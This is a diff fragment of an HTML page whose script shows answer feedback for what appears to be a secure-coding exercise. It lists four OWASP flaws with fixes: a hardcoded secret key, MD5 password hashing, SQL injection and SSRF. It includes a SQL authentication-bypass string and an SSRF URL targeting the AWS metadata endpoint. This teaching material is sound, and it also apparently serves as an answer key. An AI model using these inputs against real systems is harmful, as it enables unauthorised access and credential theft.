+  fb.innerHTML = `
+  <strong>Issue 1 — A05 Security Misconfiguration:</strong> Hardcoded <code>secret_key</code> in source code. Fix: <code>app.secret_key = os.environ.get('SECRET_KEY')</code><br><br>
+  <strong>Issue 2 — A02 Cryptographic Failure:</strong> MD5 for password hashing. MD5 is a fast hash — crackable with GPU in seconds. Fix: <code>bcrypt.hashpw(pwd.encode(), bcrypt.gensalt(rounds=12))</code><br><br>
+  <strong>Issue 3 — A03 Injection (SQL Injection):</strong> f-string query with user input. Authentication bypass possible with <code>' OR '1'='1' --</code>. Fix: <code>conn.execute("SELECT * FROM users WHERE username=? AND password=?", (user, h))</code><br><br>
+  <strong>Issue 4 — A10 SSRF:</strong> Server fetches user-controlled URL. Attacker passes <code>url=http://169.254.169.254/latest/meta-data/</code> to steal AWS credentials. Fix: validate URL host against blocklist of internal IP ranges before fetching.`;
+}
+</script>
+</body>
+</html>
